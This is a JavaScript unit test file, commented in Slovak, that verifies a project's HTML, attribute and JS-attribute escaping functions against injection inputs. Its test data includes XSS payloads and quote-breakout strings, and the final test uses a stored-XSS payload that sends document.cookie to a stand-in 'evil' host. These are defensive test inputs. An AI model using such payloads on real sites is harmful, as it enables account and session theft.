// Unit testy pre /js/pos-escape.js — jedinú implementáciu escapovania v projekte.
//
// Prečo to existuje: escapovanie bolo pred týmto v repe rozkopírované 23-krát so
// štyrmi rôznymi správaniami (časť neescapovala apostrof ani úvodzovku) a NEMALO
// jediný test. Zároveň UI sandbox testy si escHtml stubujú prázdnou funkciou,
// takže escapovanie v nich fakticky nebeží — tieto testy sú jediné miesto, kde
// sa naozaj overuje.
//
// Súbor je klasický skript (nie ESM), načítava sa cez vm do izolovaného
// kontextu s falošným `window`.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../..');

function loadEscapers() {
  const src = readFileSync(path.join(REPO_ROOT, 'js/pos-escape.js'), 'utf8');
  const win = {};
  const ctx = { window: win, module: { exports: {} } };
  vm.createContext(ctx);
  vm.runInContext(src, ctx, { filename: 'js/pos-escape.js' });
  return win;
}

const { escHtml, escAttr, escJsAttr } = loadEscapers();

test('escHtml neutralizuje HTML injektáž', () => {
  assert.equal(escHtml('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
  assert.equal(escHtml('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;/script&gt;');
  // Ampersand musí ísť PRVÝ, inak by sa dvojito escapoval výstup predošlých náhrad.
  assert.equal(escHtml('a & b'), 'a &amp; b');
  assert.equal(escHtml('&lt;'), '&amp;lt;');
});

test('escHtml escapuje OBE úvodzovky — na tom padali staršie kópie', () => {
  // Toto je presne ten rozdiel, ktorý rozhodoval: DOM-based varianty
  // (div.textContent → innerHTML) escapujú len & < >, takže hodnota vložená do
  // atribútu sa z neho dala vylomiť jednou úvodzovkou.
  assert.equal(escHtml('a"b'), 'a&quot;b');
  assert.equal(escHtml("Jack Daniel's"), 'Jack Daniel&#39;s');
  assert.equal(escHtml('" onmouseover="alert(1)'), '&quot; onmouseover=&quot;alert(1)');
});

test('escHtml je bezpečné voči null/undefined/číslam', () => {
  assert.equal(escHtml(null), '');
  assert.equal(escHtml(undefined), '');
  assert.equal(escHtml(0), '0');
  assert.equal(escHtml(12.5), '12.5');
  assert.equal(escHtml(false), 'false');
});

test('escAttr navyše rieši biele znaky a backtick', () => {
  assert.equal(escAttr('a\nb'), 'a&#10;b');
  assert.equal(escAttr('a\tb'), 'a&#9;b');
  assert.equal(escAttr('a\rb'), 'a&#13;b');
  assert.equal(escAttr('`x`'), '&#96;x&#96;');
  // nezabudne na to, čo vie escHtml
  assert.equal(escAttr('<a "b\' c>'), '&lt;a &quot;b&#39; c&gt;');
});

test('escJsAttr: poradie JS-escape → HTML-escape', () => {
  // Hodnota ide naraz do atribútu aj do JS reťazca vnútri neho:
  //   onclick="removeItem('<VALUE>')"
  // Prehliadač najprv dekóduje entity a AŽ POTOM parsuje JS, takže apostrof
  // musí byť najskôr uvedený spätnou lomkou a až ten výsledok escapovaný.
  const backslash = 'AC' + String.fromCharCode(92) + 'DC';   // AC\DC
  assert.equal(escJsAttr(backslash), 'AC' + String.fromCharCode(92, 92) + 'DC');

  // Apostrof: najprv \' , potom sa apostrof zakóduje na &#39; → \&#39;
  // Po dekódovaní prehliadačom vznikne \' , teda korektne uzavretý reťazec.
  assert.equal(escJsAttr("Daniel's"), 'Daniel' + String.fromCharCode(92) + '&#39;s');

  // Nový riadok nesmie ukončiť JS príkaz.
  assert.equal(escJsAttr('a\nb'), 'a' + String.fromCharCode(92) + 'nb');

  // Uzatvárací tag nesmie prežiť ani tu.
  assert.ok(!escJsAttr('</script>').includes('<'));
});

test('escJsAttr — po dekódovaní entít zostane platný JS reťazcový literál', () => {
  // Simulácia toho, čo spraví prehliadač: dekóduj entity v atribúte,
  // potom vyhodnoť ako JS literál. Ak escapovanie sedí, dostaneme presne
  // pôvodnú hodnotu a nič sa "nevylomí".
  const decodeEntities = (s) => s
    .replace(/&#39;/g, "'")
    .replace(/&quot;/g, '"')
    .replace(/&#96;/g, '`')
    .replace(/&#10;/g, '\n')
    .replace(/&#13;/g, '\r')
    .replace(/&#9;/g, '\t')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&');

  const nasty = [
    "Jack Daniel's",
    'AC' + String.fromCharCode(92) + 'DC',
    "'); alert(1); ('",
    '"><img src=x onerror=alert(1)>',
    'Kofola "extra" ľad',
  ];

  for (const value of nasty) {
    const attr = escJsAttr(value);
    const jsSource = "'" + decodeEntities(attr) + "'";
    // eval by tu bol reálny test, ale stačí JSON-kompatibilné overenie:
    // literál musí byť uzavretý a musí sa vyhodnotiť na pôvodnú hodnotu.
    const evaluated = vm.runInNewContext(jsSource);
    assert.equal(evaluated, value, 'nesedí pre: ' + value);
  }
});

test('escHtml zneškodní názov produktu použitý ako stored XSS', () => {
  // Reálny scenár z auditu: manažér uloží názov kategórie/produktu a admin
  // stránka ho vloží do innerHTML. CSP má 'unsafe-inline', takže bez
  // escapovania by sa skript spustil.
  const payload = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
  const out = escHtml(payload);
  assert.ok(!out.includes('<img'), 'tag nesmie prežiť');
  assert.ok(!out.includes('"'), 'úvodzovka nesmie prežiť');
  assert.equal(out.indexOf('<'), -1);
});
